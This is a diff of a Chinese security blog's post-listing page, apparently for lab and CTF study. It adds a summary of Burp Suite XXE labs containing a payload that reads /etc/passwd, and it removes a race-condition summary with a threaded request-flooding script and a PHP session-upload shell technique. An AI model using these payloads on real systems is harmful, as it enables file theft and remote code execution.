@@ -110,6 +110,21 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/">burpsuite靶场XXE</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">参考以下文章学习
+https://xz.aliyun.com/t/3357什么是XML？ XML全称是可扩展标记语言，是用来存储和传输数据的一种数据格式，结构上和HTML类似，但是XML使用的是自定义的标签名，XML在Web早期中比较流行，现在开始流行JSON格式的数据了。
+什么是XML实体？ XML实体是一种表示数据项的方式，比如用实体&lt; and &gt;表示符号&lt;和&gt;，XML用实体来表示XML标签。
+什么是文档类型定义(DTD)？ DTD全称是document type definition，其可以定义XML文档的结构、它可以包含的数据类型和其他项目。DTD在XML文档开头以可选DOCTYPE节点中声明。DTD可以在文档内部(内部DTD)或从其他地方(外部DTD)加载，也可以混合加载。
+什么是XML自定义实体？ XML允许在DTD中自定义实体，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt; 如例所示，首先声明了一个名为foo的DTD，然后在DTD中声明了一个自定义实体，名为myentity，该自定义实体中的数据为”my entity value”，可以使用&amp;myentity引用该自定义实体中的数据。
+什么是XML外部实体？ XML外部实体也是一种自定义实体，它声明的在DTD之外，外部实体的声明使用SYSTEM关键字，然后指定加载实体值的URL，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt; URL也可以是使用file伪协议从而加载指定的文件内容，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt; XXE漏洞就是利用这种特性获取敏感文件内容或者发动如命令执行、SSRF等攻击。
+使用外部实体利用 XXE 来检索文件 访问产品页面，单击“检查库存”，抓包
+然后就是构造外部实体来查看文件
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt; ]&gt;&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt; 将productId数字替换为对外部实体的引用：&amp;xxe;
+利用 XXE 执行 SSRF 攻击 与上题payload类似</div><div class="post-footer">
+        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/xxe/">Xxe</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BA%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">burpsuite靶场请求走私</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">HTTP 请求走私 什么是 HTTP 请求走私？ HTTP 请求走私是一种干扰网站处理从一个或多个用户接收到的 HTTP 请求序列的方式的技术。请求走私漏洞在本质上通常很关键，允许攻击者绕过安全控制，获得对敏感数据的未授权访问，并直接危害其他应用程序用户。
@@ -218,29 +233,6 @@ SQL注入 前台 files/content.php
 反射型XSS $page=addslashes($_GET[&#39;page&#39;]); if ($page&lt;&gt;&#34;&#34;){ if ($page&lt;&gt;1){ $pages=&#34;第&#34;.$page.&#34;页 - &#34;; } &lt;?</div><div class="post-footer">
         <a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%86%8A%E6%B5%B7cms_v1.0/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/php/">Php</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">前言 之前一直没有专门找时间分析条件竞争是什么，也只是浅显的认为跟文件包含有些关系，还是主要通过ctfshow的文件包含来了解的。还是有必要捋一下条件竞争这个东西。
-什么是条件竞争 看大家写的专业点的术语大概是条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。
-通俗一点的解释也有群友在讲条件竞争 好比有人问你两句话 第一句“你有没有男朋友” 如果你回答没有 他会说第二句“现在我是你男朋友了” 但是 加入100个男人一次一次的问 你只会有一个男朋友， 100个男人同时问 只要你能同时回答100个 你就有100个男朋友了
-假设程序同时处理存钱和取钱，当取钱&quot;速度&quot;大于存钱时，可能就会出现取钱后程序还未来得及将金额减少，程序又立马处理存钱，由此产生非预期的结果
-我觉得还挺好理解的。
-例题Hgame2023 Hgame2023 中出现一道条件竞争的题目，很好的利用了这个思路
-我有10元，但是flag需要10000000000元
-可以简单粗暴地使用条件竞争,直接重复买Flag10000次，就赌服务器检查不过来
-import requests import threading def req(): url = &#39;http://week-3.hgame.lwsec.cn:31111/api/v1/user/buyProduct?product=Flag&amp;number=1&#39; headers = { &#39;Cookie&#39;:&#39;SESSION=MTY3NTE4OTc0NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwQnP1C-gBhrFuG-GFI2yGPc3QsG0CSUEHeRahONCVOxw==; session=MTY3NTE5MzMxMHxEdi1CQkFFQ180SUFBUkFCRUFBQUtQLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dJQUFZeE1qTTBOVFk9fKDfSi3Bd18TAleiQIVGKj5Tlcxs4toyGz3e-eLGoGRV&#39; } r = requests.get(url=url, headers=headers) for i in range(10000): threading.Thread(target=req).start() 10000次 竞争，成功竞争出去了一百多次
-例题 1.文件上传+条件竞争 一般是上传文件，绕过防护之后，小马又会被立马删除。但是由于文件存在过，我们可以利用python脚本不断访问shell，这样就形成了python脚本和web删除程序之间的竞争，一定的测试量后，可以竞争到资源，执行shell，从而得到flag。
-https://co0ontty.github.io/2019/04/12/batterupload.html这个文章的例题挺清晰的
-burpsuit的攻击模块多线程不断发包，以达到我们的预期效果。
-2.session文件包含+条件竞争 这是我想学习的重点了 ,是通过ctfshow的web82来进行了解 https://www.bilibili.com/video/BV1P64y1Q72q?p=5&vd_source=cf73ac8de9b7c0322b1bccf77de91c5d先了解一下基础的前置知识：
-在cookie中设置 PHPSESSION=aaa 则会生成一个临时文件 /tmp/sess_aaa ，所以我们可控文件名
-文件内容如何控制？用PHP_SESSION_UPLOAD_PRGRESS参数
-PHP_SESSION_UPLOAD_PRGRESS参数的值为123，则 /tmp/sess_aaa的内容为123，则文件内容可控制
-由此原理我们可以写进shell然后rce
-首先通过PHP_SESSION_UPLOAD_PRGRESS在/tmp/sess_xxxx中写入一个shell</div><div class="post-footer">
-        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -263,10 +255,14 @@ PHP_SESSION_UPLOAD_PRGRESS参数的值为123，则 /tmp/sess_aaa的内容为123�
                     <span class="page-link">
                         <a href="/page/11/">11</a>
                     </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/12/">12</a>
+                    </span>
                 </li></ul></div></div>
             </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
 
